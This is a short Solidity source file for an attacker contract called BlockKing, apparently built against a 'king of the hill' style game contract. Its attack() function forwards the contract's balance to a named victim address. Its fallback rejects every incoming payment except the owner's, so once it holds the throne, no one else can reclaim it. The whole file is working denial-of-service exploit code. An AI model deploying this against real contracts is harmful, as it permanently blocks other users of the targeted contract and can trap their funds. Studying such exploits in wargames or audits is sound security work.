// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BlockKing {
  address payable internal _owner;
  event OnAttack(uint256 _bal, address _victom);

  constructor() payable {
    _owner = payable(msg.sender);
  }

  modifier onlyOwner {
    require(msg.sender == _owner, "expects to be called by owner");
    _;
  }

  function bal() public view returns(uint256 balance) {
    return address(this).balance;
  }

  function attack(address payable victom) public onlyOwner {
    uint256 _bal = address(this).balance;
    emit OnAttack(_bal, victom);

    require(_bal > 0, "bal is zero");
    victom.call{ value: _bal, gas: 4000000 }("");
  }

  fallback() external payable  {
    require(msg.sender == _owner, "whoops, not the mama");
  }
}
